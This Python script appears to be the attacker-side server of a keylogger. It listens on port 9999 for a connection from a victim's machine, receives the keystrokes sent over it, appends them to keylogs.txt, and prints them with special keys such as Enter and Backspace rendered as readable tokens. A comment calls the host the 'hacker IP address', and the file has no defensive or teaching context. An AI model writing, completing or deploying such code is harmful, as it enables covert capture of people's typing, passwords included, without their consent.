import socket

host = '' #hacker IP address in string, actually don't need it
port = 9999

s = socket.socket()
s.bind((host, port))
s.listen(2)

def file_write(keys):
    with open("keylogs.txt","a") as file:
        for key in keys:
            file.write(key)

print(host)
conn, address = s.accept()
print("Connected to Client: " + str(address))
while True:
    data = conn.recv(1024).decode()
    file_write(str(data))
    if not data:
        break
    if str(data) == 'Key.space':
        data = ' '
    if str(data) == 'Key.enter':
        data = '\n'
    if str(data) == 'Key.tab':
        data = '\t'
    if str(data) == 'Key.backspace':
        data = ' [backspace] '
    if str(data) == 'Key.shift' or str(data) == 'Key.shift_r':
        data = ''
    if str(data) == 'Key.ctrl' or str(data) == 'Key.ctrl_r':
        data = ' [ctrl] '
    if str(data) == 'Key.alt' or str(data) == 'Key.alt_r':
        data = ' [alt] '
    if str(data) == 'Key.cmd' or str(data) == 'Key.cmd_r':
        data = ' [cmd] '
    if str(data) == 'Key.caps_lock':
        data = ' [caps lock] '
    if str(data) == 'Key.left':
        data = ' [left] '
    if str(data) == 'Key.right':
        data = ' [right] '
    if str(data) == 'Key.up':
        data = ' [up] '
    if str(data) == 'Key.down':
        data = ' [down] '
    print(str(data).strip("'"), end='', flush=True)
conn.close()
